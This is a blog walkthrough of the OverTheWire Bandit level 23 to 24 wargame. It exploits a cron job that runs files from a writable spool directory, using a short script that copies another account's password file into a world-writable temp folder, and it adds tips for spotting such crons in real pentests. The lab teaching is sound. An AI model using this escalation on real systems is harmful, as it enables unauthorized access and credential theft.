---
title: "OverTheWire Bandit: Level 23 → 24 Walkthrough"
date: 2026-10-19 21:30:00 +0200
categories: [Linux, Bandit]
tags: [bandit, overthewire, linux, cron, privesc, bash, scripting, mktemp]
description: OverTheWire Bandit level 23 to 24 walkthrough, dropping your own script into a directory a cron runs as bandit24, a real privilege escalation.
ref: bandit-23-24
serie: bandit
nivel: 24
---

This is the most interesting cron level so far, and the first where we really **escalate privileges**. Until now we just read whatever a scheduled task left behind. Now the cron **executes** scripts from a directory we can write to, so the play is to drop **our own script** for bandit24 to run on our behalf. It's exactly the "writable cron" pattern you'll exploit on real machines.

> Level passwords are shown as **[REDACTED]**. Following OverTheWire's rules, I don't publish credentials: the fun part is getting there yourself.
{: .prompt-warning }

## The challenge

The [level goal](https://overthewire.org/wargames/bandit/bandit24.html) sends us to `/etc/cron.d/` again, but warns that this time the cron does something different. The config keeps the usual pattern:

```console
bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
```

A script that runs **as bandit24** every minute. The difference, as always, is inside.

## Read the script

```console
bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

shopt -s nullglob

myname=$(whoami)

cd /var/spool/"$myname"/foo || exit
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." ] && [ "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" "./$i")"
        if [ "${owner}" = "bandit23" ] && [ -f "$i" ]; then
            timeout -s 9 60 "./$i"
        fi
        rm -rf "./$i"
    fi
done
```

Here's what it does, running **as bandit24**:

- **`shopt -s nullglob`**: if a pattern like `*` finds no files, it expands to nothing instead of leaving the literal `*`. Avoids errors in the loop when the directory is empty.
- **`cd /var/spool/bandit24/foo`** (since `myname` is `bandit24`): enters that directory. If it doesn't exist or can't enter, `|| exit` aborts.
- **The `for i in * .*` loop**: walks **all** files in the directory, including hidden ones (`.*`), skipping `.` and `..`.
- **`owner="$(stat --format "%U" "./$i")"`**: gets each file's owner.
- **`if [ "${owner}" = "bandit23" ] && [ -f "$i" ]`**: the key condition. It only runs the file if its owner is **bandit23** (us!) and it's a regular file.
- **`timeout -s 9 60 "./$i"`**: runs it, killing it with `SIGKILL` if it takes more than 60 seconds.
- **`rm -rf "./$i"`**: deletes the file afterwards, no matter what.

Translated: every minute, bandit24 enters `/var/spool/bandit24/foo` and **runs everything in there that's owned by bandit23**. It's literally inviting us to leave it a script of ours to run with its permissions.

## The plan

The escalation idea:

1. Write a script that reads bandit24's password (`/etc/bandit_pass/bandit24`) and copies it somewhere **I** can read later.
2. Drop that script in `/var/spool/bandit24/foo`, with me (bandit23) as the owner.
3. Wait for the cron to run it **as bandit24**, who can read that password.
4. Read the result.

The fine detail: the cron runs the script as bandit24, but **the output file is written by bandit24**, not me. So that file (and the folder it lands in) need permissions that let me read it afterwards. That's why we'll be generous with permissions.

## The solution step by step

### 1. A working directory with `mktemp`

`/tmp` is world-writable, so I create a unique temporary folder there with `mktemp -d` and give it full permissions so bandit24 can write inside:

```console
bandit23@bandit:~$ mktemp -d
/tmp/tmp.d4iKxOa5lF
bandit23@bandit:~$ cd /tmp/tmp.d4iKxOa5lF
bandit23@bandit:/tmp/tmp.d4iKxOa5lF$ chmod 777 /tmp/tmp.d4iKxOa5lF
```

> `mktemp -d` creates a directory with a guaranteed-unique random name. It's good practice to work this way in `/tmp` so you don't clobber other users' files or leave traces with predictable names. Yours will have a different name: use whatever you get.
{: .prompt-info }

### 2. Create the output file and the script

I create two files: `password` (where the password will land) and `script.sh` (what bandit24 will run), and give them full permissions:

```console
bandit23@bandit:/tmp/tmp.d4iKxOa5lF$ touch password script.sh
bandit23@bandit:/tmp/tmp.d4iKxOa5lF$ chmod 777 password script.sh
```

The `chmod 777` on the `password` file matters: it will be **written by bandit24**, but I have to **read it** myself. With open permissions, both can.

The contents of `script.sh`:

```bash
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/tmp.d4iKxOa5lF/password
```

When bandit24 runs this, it reads its own password (it can, it's its own) and dumps it into my `password` file. Notice I use the **absolute path** to the output file: the cron runs the script from `/var/spool/bandit24/foo`, not from my folder, so a relative path wouldn't work.

### 3. Drop the script in the cron's mailbox

I copy the script into the directory the cron watches:

```console
bandit23@bandit:/tmp/tmp.d4iKxOa5lF$ cp script.sh /var/spool/bandit24/foo/script.sh
```

I copy it (`cp`) instead of moving it so the file at the destination is created by bandit23, i.e. its **owner is me**, which is exactly what the script's condition requires (`owner = bandit23`).

> The script has to be executable. Since I gave it `chmod 777` before copying, it already is. If you forget, the cron won't run it (the `-f` check passes, but `timeout ./script.sh` would fail without execute permission).
{: .prompt-tip }

### 4. Wait and read

The cron runs every minute. I wait a minute or two and read the `password` file:

```console
bandit23@bandit:/tmp/tmp.d4iKxOa5lF$ cat password
[REDACTED]
```

There's bandit24's password. (If you read it too soon, the file will be empty: wait for the cron to run.)

## Why this matters in security

This level is a **textbook privilege escalation**. The flaw isn't yours, it's by design: a privileged process (bandit24) executes files from a directory a lower-privileged user (bandit23) can write to. Once you can place an executable in a path run by a more privileged user, you can run **whatever you want** with those permissions: read their secrets, pop a shell as them, etc.

On a real machine you'd look for exactly this:

- Crons that execute scripts in writable directories (`/tmp`, `/var/spool`, loosely permissioned paths).
- Cron scripts that don't use absolute paths (hijackable via `PATH`).
- Directories with `777` or owned by you in a root process's flow.

> The difference between the previous level and this one is the difference between "read a leak" and "run code as another user". The second is what actually gets you to `root` in a pentest.
{: .prompt-tip }

## Moving to the next level

```console
bandit23@bandit:/tmp/tmp.d4iKxOa5lF$ ssh bandit24@bandit.labs.overthewire.org -p 2220
```

Log in and use the bandit24 password you just recovered.

> The next level changes gear completely: it involves a **daemon** that asks for a 4-digit PIN, and you'll have to **brute-force** it with a script. Get ready to write your first attack loop.
{: .prompt-info }

## Summary

| Command / concept | What it's for |
| --- | --- |
| Writable cron | A privileged process runs files from a directory you can write to |
| `shopt -s nullglob` | Make a pattern with no matches expand to nothing |
| `stat --format "%U" file` | Get a file's owner |
| `timeout -s 9 60 cmd` | Run a command, killing it after 60 s (SIGKILL) |
| `mktemp -d` | Create a temporary directory with a unique name |
| `chmod 777` | Full permissions: needed so another user can write / you can read |
| `cp` (not `mv`) | Make the destination file owned by whoever copies it |
| Absolute path in the script | The cron runs from a different directory than yours |

{% include series-nav.html %}
